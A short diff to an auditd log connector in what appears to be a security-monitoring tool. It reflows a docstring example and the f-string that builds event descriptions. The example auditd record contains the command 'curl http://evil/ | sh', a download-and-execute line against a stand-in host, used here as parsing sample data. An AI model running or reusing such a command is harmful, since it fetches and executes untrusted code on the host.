@@ -35,7 +35,8 @@ Auditd log format (the parsing problem)
     ``msg=audit(timestamp:serial)`` identifier. Example
     ``execve`` event::
 
-        type=SYSCALL msg=audit(1715520000.123:9876): arch=c000003e syscall=59 success=yes ... uid=1000 auid=1000 comm="bash" exe="/usr/bin/bash" key="aisoc_exec"
+        type=SYSCALL msg=audit(1715520000.123:9876): arch=c000003e syscall=59 success=yes ...
+            uid=1000 auid=1000 comm="bash" exe="/usr/bin/bash" key="aisoc_exec"
         type=EXECVE  msg=audit(1715520000.123:9876): argc=3 a0="bash" a1="-c" a2="curl http://evil/ | sh"
         type=CWD     msg=audit(1715520000.123:9876): cwd="/tmp"
         type=PATH    msg=audit(1715520000.123:9876): item=0 name="/usr/bin/bash" ...
@@ -681,9 +682,7 @@ class AuditdConnector(BaseConnector):
             "external_id": raw.get("event_id"),
             "title": title,
             "description": (
-                f"syscall={syscall} exe={exe} key={key} "
-                f"actor_uid={actor_uid} path={path} "
-                f"argv={' '.join(argv) if argv else None}"
+                f"syscall={syscall} exe={exe} key={key} actor_uid={actor_uid} path={path} argv={' '.join(argv) if argv else None}"
             ),
             "severity": severity,
             "host": self._host_label,
